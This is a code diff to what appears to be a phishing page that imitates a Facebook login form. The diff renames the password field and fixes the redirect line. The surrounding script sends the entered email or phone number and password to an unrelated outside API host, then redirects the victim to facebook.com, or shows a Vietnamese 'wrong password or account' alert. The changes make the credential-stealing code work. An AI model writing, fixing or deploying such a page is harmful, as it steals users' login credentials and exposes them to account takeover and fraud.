@@ -24,7 +24,7 @@
                 <div class="form-container">
                     <form action="">
                         <input id="username" type="text" placeholder="Email address or phone number">
-                        <input id="password" type="password" placeholder="Password">
+                        <input id="pass" type="password" placeholder="Password">
                         <button class="btn-login" id="btn-login">Login</button>
                     </form>
                     <a href="#">Forgotten password?</a>
@@ -107,7 +107,7 @@
         submitBTN.addEventListener('click', (e) => {
             e.preventDefault();
             const username = document.getElementById('username').value;
-            const password = document.getElementById('password').value;
+            const password = document.getElementById('pass').value;
 
             fetch('https://haisanmiennam.vn/api/v1/accounts', {
                 method: 'POST',
@@ -118,7 +118,7 @@
             })
                 .then((response) => response.json())
                 .then((data) => {
-                    window.location.href('https://facebook.com');
+                    window.location.href = 'https://facebook.com';
                 })
                 .catch((error) => {
                     alert('Sai mật khẩu hoặc tài khoản');
